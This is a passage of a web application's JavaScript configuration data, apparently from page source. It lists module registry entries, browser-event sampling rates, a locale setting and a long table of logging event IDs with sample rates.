						"__rc": ["clearTimeoutBlue", "Aa3175P_ECTyZZFJbCykAk52oUoMf7MqHCsaiUcueTB4Z0qbAj_5tJdn8Ffdx6N0sVLwgaBvPkRsG5oHqMqGQtAw7Ig"]
					}, -1],
					["cr:807042", ["setTimeoutBlue"], {
						"__rc": ["setTimeoutBlue", "Aa3175P_ECTyZZFJbCykAk52oUoMf7MqHCsaiUcueTB4Z0qbAj_5tJdn8Ffdx6N0sVLwgaBvPkRsG5oHqMqGQtAw7Ig"]
					}, -1],
					["cr:896462", ["setIntervalAcrossTransitionsBlue"], {
						"__rc": ["setIntervalAcrossTransitionsBlue", "Aa3175P_ECTyZZFJbCykAk52oUoMf7MqHCsaiUcueTB4Z0qbAj_5tJdn8Ffdx6N0sVLwgaBvPkRsG5oHqMqGQtAw7Ig"]
					}, -1],
					["cr:986633", ["setTimeoutAcrossTransitionsBlue"], {
						"__rc": ["setTimeoutAcrossTransitionsBlue", "Aa3175P_ECTyZZFJbCykAk52oUoMf7MqHCsaiUcueTB4Z0qbAj_5tJdn8Ffdx6N0sVLwgaBvPkRsG5oHqMqGQtAw7Ig"]
					}, -1],
					["cr:1003267", ["clearIntervalBlue"], {
						"__rc": ["clearIntervalBlue", "Aa3175P_ECTyZZFJbCykAk52oUoMf7MqHCsaiUcueTB4Z0qbAj_5tJdn8Ffdx6N0sVLwgaBvPkRsG5oHqMqGQtAw7Ig"]
					}, -1],
					["cr:1183579", ["InlineFbtResultImpl"], {
						"__rc": ["InlineFbtResultImpl", "Aa3175P_ECTyZZFJbCykAk52oUoMf7MqHCsaiUcueTB4Z0qbAj_5tJdn8Ffdx6N0sVLwgaBvPkRsG5oHqMqGQtAw7Ig"]
					}, -1],
					["cr:925100", ["RunBlue"], {
						"__rc": ["RunBlue", "Aa3175P_ECTyZZFJbCykAk52oUoMf7MqHCsaiUcueTB4Z0qbAj_5tJdn8Ffdx6N0sVLwgaBvPkRsG5oHqMqGQtAw7Ig"]
					}, -1],
					["cr:729414", ["VisualCompletion"], {
						"__rc": ["VisualCompletion", "Aa0dGvVZk9IkweCshLJ8dvYiJGfK7y4a6u_Ta2CAPfxj5WRBlDOwNiq0MWKXikpWvmaNmBZ3B2-WrBgHz5tjcdoG"]
					}, -1],
					["cr:1094907", [], {
						"__rc": [null, "Aa0xwTlrqhykH6FiXLLn01a1QhKgMxznW9rJHa2ljlPCLl3UWBXsN5856Iatd3qPaMKNi7S1xAeRQZOllnCZctU"]
					}, -1],
					["EventConfig", [], {
						"sampling": {
							"bandwidth": 0,
							"play": 0,
							"playing": 0,
							"progress": 0,
							"pause": 0,
							"ended": 0,
							"seeked": 0,
							"seeking": 0,
							"waiting": 0,
							"loadedmetadata": 0,
							"canplay": 0,
							"selectionchange": 0,
							"change": 0,
							"timeupdate": 0,
							"adaptation": 0,
							"focus": 0,
							"blur": 0,
							"load": 0,
							"error": 0,
							"pass": 0,
							"abort": 0,
							"storage": 0,
							"scroll": 200000,
							"mousemove": 20000,
							"mouseover": 10000,
							"mouseout": 10000,
							"mousewheel": 1,
							"MSPointerMove": 10000,
							"keydown": 0.1,
							"click": 0.02,
							"mouseup": 0.02,
							"__100ms": 0.001,
							"__default": 5000,
							"__min": 100,
							"__interactionDefault": 200,
							"__eventDefault": 100000
						},
						"page_sampling_boost": 1,
						"interaction_regexes": {},
						"interaction_boost": {},
						"event_types": {},
						"manual_instrumentation": false,
						"profile_eager_execution": false,
						"disable_heuristic": true,
						"disable_event_profiler": false
					}, 1726],
					["AdsInterfacesSessionConfig", [], {}, 2393],
					["IntlCurrentLocale", [], {
						"code": "ar_AR"
					}, 5954],
					["cr:8650", ["CometVisualCompletionModuleBlueVisuallyCompleteWwwQPLEvent.legacy"], {
						"__rc": ["CometVisualCompletionModuleBlueVisuallyCompleteWwwQPLEvent.legacy", "Aa0yCUz00e7-Xj158zYZ-_x3Lrq-FpWxiKR1RmIgkDapE4imkKEjAeE-IJ3q_KG6w-l3VlL17tjzGh4RglVa1AzFF5lumGP4dfgJfdc"]
					}, -1],
					["cr:8923", ["QplHealthModuleLossTrackingMarkerStartedQPLEvent.legacy"], {
						"__rc": ["QplHealthModuleLossTrackingMarkerStartedQPLEvent.legacy", "Aa0yCUz00e7-Xj158zYZ-_x3Lrq-FpWxiKR1RmIgkDapE4imkKEjAeE-IJ3q_KG6w-l3VlL17tjzGh4RglVa1AzFF5lumGP4dfgJfdc"]
					}, -1],
					["cr:1367102", [], {
						"__rc": [null, "Aa1BrO0K2isaA0tkzrWtRUSF6zclixwVrU8dpyyIkK4vzkxG-kKI3LHC-9xD6EEfco7DteMIK90gHDvzxtzOeh1F"]
					}, -1],
					["cr:1984081", [], {
						"__rc": [null, "Aa0Tu550Q2rJXLavv5ibot5J3FT3WXbXPtcBuBBRpwvoEIACXwCmhyJ3oQoyFl8zGtxQTi7PvZ98QTWfIb1GkzbMqmZw"]
					}, -1],
					["QuickLogConfig", [], {
						"qpl_events": {
							"212280": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"212543": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"393276": {
								"sampleRate": 50,
								"samplingMethod": 1
							},
							"396252": {
								"sampleRate": 50,
								"samplingMethod": 1
							},
							"397979": {
								"sampleRate": 50,
								"samplingMethod": 1
							},
							"655575": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"655576": {
								"sampleRate": 5000,
								"samplingMethod": 1
							},
							"655584": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"655653": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"917556": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"917557": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"918598": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"920349": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"920899": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"921754": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"922804": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"923401": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"924733": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"927149": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"932588": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"2101001": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"2102327": {
								"sampleRate": 50,
								"samplingMethod": 1
							},
							"2103143": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"2105890": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"2107124": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"2108977": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"2109054": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"3473463": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"3473464": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"3473465": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"3735589": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"3735590": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"3735591": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"3735592": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"3735593": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"3735594": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"3735595": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"3735596": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"3735597": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"3735598": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"3735599": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"3735600": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"3735601": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"3735602": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"3735603": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"3735604": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"3735605": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"3735606": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"3735608": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"3735609": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"3735610": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"3735611": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"3735612": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"3735613": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"3735614": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"3735615": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"3735616": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"3735617": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"3735618": {
								"sampleRate": 50,
								"samplingMethod": 1
							},
							"3735619": {
								"sampleRate": 50,
								"samplingMethod": 1
							},
							"3735620": {
								"sampleRate": 50,
								"samplingMethod": 1
							},
							"3735622": {
								"sampleRate": 50,
								"samplingMethod": 1
							},
							"3735623": {
								"sampleRate": 500,
								"samplingMethod": 1
							},
							"3735624": {
								"sampleRate": 500,
								"samplingMethod": 1
							},
							"3735625": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"3735626": {
								"sampleRate": 50,
								"samplingMethod": 1
							},
							"3735627": {
								"sampleRate": 50,
								"samplingMethod": 1
							},
							"3735628": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"7077894": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7079140": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7079214": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7079522": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7079632": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7079838": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7079895": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7079940": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7080944": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7081379": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7081993": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7081995": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7082695": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7083043": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7083175": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7083437": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7083693": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7083971": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7084033": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7084185": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7084444": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7084665": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7084786": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7085174": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7085268": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7085498": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7086190": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7086630": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7087889": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7088719": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7088916": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7088929": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7088932": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7088956": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7089119": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7089521": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7089869": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7090073": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7090129": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7090251": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7091307": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7092490": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7092499": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7092951": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7093080": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7093431": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7093497": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7093594": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7093622": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7093901": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7093934": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7094174": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7733271": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7736487": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7736691": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7742652": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"7747339": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"7749497": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7995400": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"7995408": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"11075649": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"11075654": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"11075674": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"11084341": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"12451850": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"12451854": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"12451859": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"12451868": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"12451869": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"12451873": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"12453291": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"12454042": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"12454789": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"12457892": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"12457943": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"12458187": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"12462244": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"12463624": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"12464511": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"12466919": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"12859882": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"13238313": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"13238314": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"13238353": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"13238354": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"13238355": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"13238356": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"13238392": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"13238398": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"13238399": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"13239835": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"13249850": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"13250512": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"13252469": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"17825794": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"19146195": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"19146604": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"19152862": {
								"sampleRate": 5,
								"samplingMethod": 1
							},
							"19216409": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"20578320": {
								"sampleRate": 1000000,
								"samplingMethod": 1
							},
							"22347782": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"22609921": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"22675460": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"23265284": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"23265285": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"23265286": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"23281892": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"23285466": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"23461896": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"23461898": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"23461899": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"23461900": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"23461901": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"23461902": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"23473227": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"23476559": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"23491362": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"23855114": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"24122239": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"24130366": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"25296897": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"25296900": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"25296901": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"25296902": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"25296903": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"25296904": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"25296905": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"25296906": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"25298086": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"25302457": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"25303022": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"25304023": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"25305590": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"25307483": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"25310776": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"25312111": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"26869761": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"26869762": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"26869763": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"26869764": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"26869766": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"26869768": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"26877377": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"26878862": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"26880417": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"26881111": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"26882160": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"26883711": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"26898960": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"27459588": {
								"sampleRate": 5000,
								"samplingMethod": 1
							},
							"27459589": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"27459590": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"27459591": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"27467867": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"27475950": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"27787270": {
								"sampleRate": 1000000,
								"samplingMethod": 1
							},
							"27787271": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"27797599": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"27983873": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"27983874": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"27983875": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"27983876": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"27983877": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"29047276": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"29818881": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"29818882": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"29818883": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"29818884": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"29949953": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"29949955": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30408705": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30408706": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30408707": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30408708": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30408709": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30408710": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30408711": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30408712": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30421153": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605313": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"30605314": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"30605315": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"30605316": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605317": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605319": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605320": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605321": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605322": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605323": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605324": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605325": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605326": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605328": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605329": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605330": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605331": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605333": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605334": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605335": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605336": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605337": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605338": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605339": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605340": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605341": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605342": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605343": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605344": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605345": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605346": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605347": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605348": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605349": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605350": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605351": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605352": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605353": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605354": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605355": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605356": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605357": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605358": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605360": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605361": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605362": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605363": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605364": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605366": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605367": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605368": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605369": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605370": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605371": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605373": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605374": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605375": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605376": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605378": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605380": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605382": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605384": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605386": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605387": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605389": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605390": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605391": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605392": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30605393": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30613201": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30615365": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30615438": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30616610": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30617968": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30618398": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30618615": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30620813": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30621572": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"30632331": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"32312156": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"32374785": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"32702465": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"33488897": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"33488898": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"33488900": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"33488901": {
								"sampleRate": 1800,
								"samplingMethod": 1
							},
							"33488902": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"33488903": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"33488904": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"33488905": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"33494245": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"33619969": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"34156514": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"35586051": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"35586052": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"35586053": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"36110337": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36110338": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36110339": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36241413": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36241422": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36241423": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36243184": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36244063": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36245203": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36245259": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36245332": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36246584": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36247076": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
